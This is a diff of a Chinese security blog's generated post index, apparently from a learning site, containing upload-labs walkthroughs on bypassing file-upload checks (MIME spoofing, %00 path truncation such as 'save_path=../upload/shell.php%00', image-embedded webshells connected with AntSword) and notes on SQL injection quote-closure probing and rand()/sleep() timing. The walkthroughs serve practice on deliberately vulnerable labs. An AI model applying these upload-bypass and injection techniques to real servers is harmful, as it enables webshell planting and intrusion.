+|  712 |  0.7738459508622493 |
+|   18 |  0.9323689853142658 |
+|   92 |  0.3403071047182261 |
++------+---------------------+
+12 rows in set (0.00 sec)
+</code></pre>
+<p>对此毫无影响.</p>
+<p>所以我们可以推测,sleep()作为一个没有返回值的函数(没有返回值不等于返回NULL),会使得随机种子变得不随机,我们上面可以看到,一直重复着某一个值.所以我认为rand()函数的源码中可能会有检测参数的方法存在,并且这个方法检测到类似sleep()这种没有返回值的函数,就会让rand()的随机种子出现一定的问题,使得rand()不再具有随机性.因为MySQL的开发人员也不会想到有人居然会往rand()函数中添加sleep()函数.</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>1.rand()是随机的,而rand(0)等里面存在参数的时候随机种子就被人为固定而不会真正随机.</strong></p>
+<p><strong>2.rand()里面只有含有sleep()等无返回函数,rand()函数的随机性就会失效,返回数据库最初始的数据(仅仅按生成的顺序)</strong></p>
+<p>//关于第二点也仅仅是我的推测,官方文档中并没有写关于这些的.</p>
+<p><strong>3.查询的数据包含sleep()或者排序的时候带有sleep()的话,则会重复sleep(),重复的次数为记录数,因为查询或者排序都需要遍历数据,而每次遍历都会顺带执行sleep()这个函数.</strong></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传漏洞(前端js)</title>
     <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/</url>
     <content><![CDATA[<h1 id="文件上传漏洞-js检查"><a href="#文件上传漏洞-js检查" class="headerlink" title="文件上传漏洞(js检查)"></a>文件上传漏洞(js检查)</h1><p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/551e5e41ccbff889fa8bb98ad343f2f8.png" alt="2509712-20211104183800761-251747689.png"></p>
@@ -797,27 +1023,34 @@ aiyou\&quot;bu\&quot;cuoo
       </tags>
   </entry>
   <entry>
-    <title>SQL注入判断闭合小技巧</title>
-    <url>/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<h1 id="SQL注入判断闭合小技巧"><a href="#SQL注入判断闭合小技巧" class="headerlink" title="SQL注入判断闭合小技巧"></a>SQL注入判断闭合小技巧</h1><p>在前面的联合注入中我讲到过如何判断字符型还是数字型,用的办法是依靠PHP的弱类型来完成判断的,但是这个方法具有一定的局限性,且比较麻烦,需要不停试.</p>
-<p>比如在遇到order by xx的时候,用这种方法就无效了.</p>
-<p>后面我偶然习得一个更好的方法分享给大家:</p>
-<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/eb84da2ec71885274f5817b6b19105d7.png" alt="截图"></p>
-<p>当我输入sort=1’的时候,会有报错’’’出来,三个单引号,第一个和最后一个是系统自带的,提示我们中间的单引号出错了.我们知道,mysql检测是从头到尾顺序检测的,说明我们在这个引号之前都是对的.比如说这一关,我们现在的查询语句为:</p>
-<p><code> order by 1&#39;</code></p>
-<p>他现在只显示’错误,说明前面的order by 1 是正确的语法,说明我们用的就是数字型.</p>
-<p>那如果是字符型呢?</p>
-<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/2c659b53f1b9fde4c89abf377edbae47.png" alt="截图"></p>
-<p>当我输入sort=1’时,它报错’’1’’’,这说明什么,去掉第一个和最后一个,告诉我们’1’’出错了.</p>
-<p>因为我们正确的语句为 order by ‘1’ ,现在变成 order by ‘1’’,而1前面的字符串无法正确闭合,所以会让整体都出错,显示出这个字符串的全部.如果我们在前面加上\符号,那么就会变成</p>
-<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/3063f67ac6aa0d26dfd1be8a836df386.png" alt="截图"></p>
-<p>因为此时的语句为<code>order by &#39;1\&#39;&#39; </code>,单引号经过斜杠的转义,变成了一个字符格式的单引号,现在1前面的单引号就能正确闭合了.</p>
+    <title>文件上传漏洞(MIME绕过)</title>
+    <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-MIME绕过"><a href="#文件上传漏洞-MIME绕过" class="headerlink" title="文件上传漏洞(MIME绕过)"></a>文件上传漏洞(MIME绕过)</h1><p>小扩展:</p>
+<blockquote>
+<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+</blockquote>
+<blockquote>
+<p>常见的MIME 类型如下<br><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/aa68aff2773d8c522e44f77df1c2b9bf.png" alt="截图"></p>
+<p>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</p>
+</blockquote>
+<p>本次以upload-labs作为例子</p>
+<p>不同于 第一关,第二关中没有js检查方法</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/078dfe17206b29b420336cc1dad9ba5a.png" alt="截图"></p>
+<p>那么我们就又要用到burp工具了</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/9477728a6a0f2e4d549de30207d7c82a.png" alt="截图"></p>
+<p>直接上传肯定是不行的</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/661776c80362e0de686a8ea80986f846.png" alt="截图"></p>
+<p>抓一下包,可以看到content-type是一个咱也看不懂的东西,我们要将其改为图片格式,绕过检查</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c12728e8fd89ccd5b2accef8a8cda137.png" alt="截图"></p>
+<p>改为这样,再放包</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c513080d3edf2c9d53a1abd7e95c0e58.png" alt="截图"></p>
+<p>上传成功,接着就可以用中国蚁剑连接即可得到答案.</p>
 ]]></content>
       <categories>
-        <category>SQL注入</category>
+        <category>文件上传漏洞</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
+        <tag>文件上传漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -848,28 +1081,22 @@ aiyou\&quot;bu\&quot;cuoo
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞(MIME绕过)</title>
-    <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞-MIME绕过"><a href="#文件上传漏洞-MIME绕过" class="headerlink" title="文件上传漏洞(MIME绕过)"></a>文件上传漏洞(MIME绕过)</h1><p>小扩展:</p>
-<blockquote>
-<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
-</blockquote>
-<blockquote>
-<p>常见的MIME 类型如下<br><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/aa68aff2773d8c522e44f77df1c2b9bf.png" alt="截图"></p>
-<p>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</p>
-</blockquote>
-<p>本次以upload-labs作为例子</p>
-<p>不同于 第一关,第二关中没有js检查方法</p>
-<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/078dfe17206b29b420336cc1dad9ba5a.png" alt="截图"></p>
-<p>那么我们就又要用到burp工具了</p>
-<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/9477728a6a0f2e4d549de30207d7c82a.png" alt="截图"></p>
-<p>直接上传肯定是不行的</p>
-<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/661776c80362e0de686a8ea80986f846.png" alt="截图"></p>
-<p>抓一下包,可以看到content-type是一个咱也看不懂的东西,我们要将其改为图片格式,绕过检查</p>
-<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c12728e8fd89ccd5b2accef8a8cda137.png" alt="截图"></p>
-<p>改为这样,再放包</p>
-<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c513080d3edf2c9d53a1abd7e95c0e58.png" alt="截图"></p>
-<p>上传成功,接着就可以用中国蚁剑连接即可得到答案.</p>
+    <title>文件上传漏洞(00截断)</title>
+    <url>/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-00截断"><a href="#文件上传漏洞-00截断" class="headerlink" title="文件上传漏洞(00截断)"></a>文件上传漏洞(00截断)</h1><h2 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h2><p>  0x00是字符串的结束标识符，这样服务器检测到0x00后就停止了向后检测,后面的内容就等于被注释了.依靠这点可以帮助我们绕过检测.</p>
+<h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>  有很多人喜欢在文件名中加%00进行截断，但其实这种方式是不对的，比如攻击者构造文件名：admintony.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)</p>
+<h2 id="正确用法"><a href="#正确用法" class="headerlink" title="正确用法"></a>正确用法</h2><p>  那么00截断应该在什么时候使用呢？数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造<code>paylod: uploads/aa.php%00</code></p>
+<p>   为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/*********.******，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/56889afa25282dc9417a785af8086f98.png" alt="截图"></p>
+<p>在GET方法中,我们可以直接在save_path路径中进行00截断:</p>
+<p><code>通过Burp Suite将save_path=../upload/ HTTP/1.1使用%00进行截断-&gt; save_path=../upload/shell.php%00 HTTP/1.1</code></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/330b351a2b88698eda2a333e6659cfc6.png" alt="截图"></p>
+<p>将文件后缀改为允许上传的后缀,在第一行路径处添加如图信息</p>
+<h3 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意!!!"></a>特别注意!!!</h3><p><strong>00截断必需条件是php版本号在5.3.4以前(不能包含5.3.4版本)</strong>,我之前试了很多次都无法成功,换了一关查看那个网页的靶场php版本超过5.3.4了,所以又换了一个靶场.</p>
+<p>在POST方法中,我们需要变得复杂一点</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/da6f77c40fdb9fddb32f4cb4e91b3ae1.png" alt="截图"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/30a45e8874e1142437a11b08b78e8e35.png" alt="截图"></p>
+<p>记得写完要用burp自带的功能给它编码一下,因为post传输的时候会自动解码.</p>
 ]]></content>
       <categories>
         <category>文件上传漏洞</category>
@@ -919,31 +1146,6 @@ aiyou\&quot;bu\&quot;cuoo
 <p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/806aaa0408e2bd20fe0c54ca6eb379ef.png" alt="f413e0ce3c183126e44b9db7a35d0598.png"></p>
 <p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/de2a1efab28d8b6df01d2b26c90ca07f.png" alt="11a4932a95d4264ffa1b764e7047a580.png"></p>
 <p>8.蓝色部分就是没有改变的地方,接着我们就可以将一句话木马插入蓝色部分,可以成功连接蚁剑.</p>
-]]></content>
-      <categories>
-        <category>文件上传漏洞</category>
-      </categories>
-      <tags>
-        <tag>文件上传漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞(00截断)</title>
-    <url>/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞-00截断"><a href="#文件上传漏洞-00截断" class="headerlink" title="文件上传漏洞(00截断)"></a>文件上传漏洞(00截断)</h1><h2 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h2><p>  0x00是字符串的结束标识符，这样服务器检测到0x00后就停止了向后检测,后面的内容就等于被注释了.依靠这点可以帮助我们绕过检测.</p>
-<h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>  有很多人喜欢在文件名中加%00进行截断，但其实这种方式是不对的，比如攻击者构造文件名：admintony.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)</p>
-<h2 id="正确用法"><a href="#正确用法" class="headerlink" title="正确用法"></a>正确用法</h2><p>  那么00截断应该在什么时候使用呢？数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造<code>paylod: uploads/aa.php%00</code></p>
-<p>   为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/*********.******，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。</p>
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/56889afa25282dc9417a785af8086f98.png" alt="截图"></p>
-<p>在GET方法中,我们可以直接在save_path路径中进行00截断:</p>
-<p><code>通过Burp Suite将save_path=../upload/ HTTP/1.1使用%00进行截断-&gt; save_path=../upload/shell.php%00 HTTP/1.1</code></p>
-<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/330b351a2b88698eda2a333e6659cfc6.png" alt="截图"></p>
-<p>将文件后缀改为允许上传的后缀,在第一行路径处添加如图信息</p>
-<h3 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意!!!"></a>特别注意!!!</h3><p><strong>00截断必需条件是php版本号在5.3.4以前(不能包含5.3.4版本)</strong>,我之前试了很多次都无法成功,换了一关查看那个网页的靶场php版本超过5.3.4了,所以又换了一个靶场.</p>
-<p>在POST方法中,我们需要变得复杂一点</p>
-<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/da6f77c40fdb9fddb32f4cb4e91b3ae1.png" alt="截图"></p>
-<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/30a45e8874e1142437a11b08b78e8e35.png" alt="截图"></p>
-<p>记得写完要用burp自带的功能给它编码一下,因为post传输的时候会自动解码.</p>
 ]]></content>
       <categories>
         <category>文件上传漏洞</category>
